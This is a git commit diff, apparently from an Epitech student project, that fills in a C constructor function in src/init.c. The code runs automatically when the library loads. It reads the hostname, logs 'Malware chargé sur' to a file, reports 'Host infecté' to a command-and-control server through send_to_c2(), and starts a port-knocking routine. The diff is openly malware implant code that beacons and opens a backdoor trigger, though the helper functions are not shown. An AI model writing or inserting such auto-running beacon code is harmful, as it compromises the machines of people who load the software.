e3c3fb7878ccd84328278f4b4c17afc88df4c7b2
Guillaume Houriez <guillaume.houriez@epitech.eu>
2025-02-08 00:29:58 +0100

    [ADD] implémentation du init, explication au commit précédent

--- src/init.c
+++ src/init.c
@@ -4,4 +4,17 @@
 __attribute__((constructor))
 void init()
 {
+    char host[256];
+    if (gethostname(host, sizeof(host)) != 0) {
+        strcpy(host, "inconnu");
+    }
+    FILE *f = fopen(LOG_FILE, "a");
+    if (f) {
+        fprintf(f, "Malware chargé sur : %s\n", host);
+        fclose(f);
+    }    
+    char reg[256];
+    snprintf(reg, sizeof(reg), "Host infecté: %s\n", host);
+    send_to_c2(reg);
+    start_port_knocking();
 }
